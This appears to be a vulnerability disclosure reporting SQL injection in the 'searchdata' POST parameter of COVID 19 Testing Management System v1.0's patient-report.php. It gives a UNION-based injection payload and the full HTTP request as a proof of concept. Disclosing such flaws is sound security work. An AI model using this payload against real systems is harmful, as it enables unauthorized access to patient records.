# COVID 19 Testing Management System v1.0 has SQL injection

BUG_Author: hertz216

Vulnerability File: /covid-tms/patient-report.php

POST parameter 'searchdata' exists SQL injection vulnerability

Payload:searchdata=1') UNION ALL SELECT NULL,NULL,CONCAT(0x71727374,0x31323334,0x61626364),NULL,NULL,NULL,NULL-- -&search=Search

```
POST /covid-tms/patient-report.php HTTP/1.1
Host: localhost
Origin: http://localhost
Cookie: PHPSESSID=unntgo3ptqns82l8h9h09sqi8u
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://localhost/covid-tms/patient-search-report.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 120

searchdata=1') UNION ALL SELECT NULL,NULL,CONCAT(0x71727374,0x31323334,0x61626364),NULL,NULL,NULL,NULL-- -&search=Search
```

![image](https://github.com/mhz2846415362/bug_report/blob/main/vendors/pictures/concat.png)
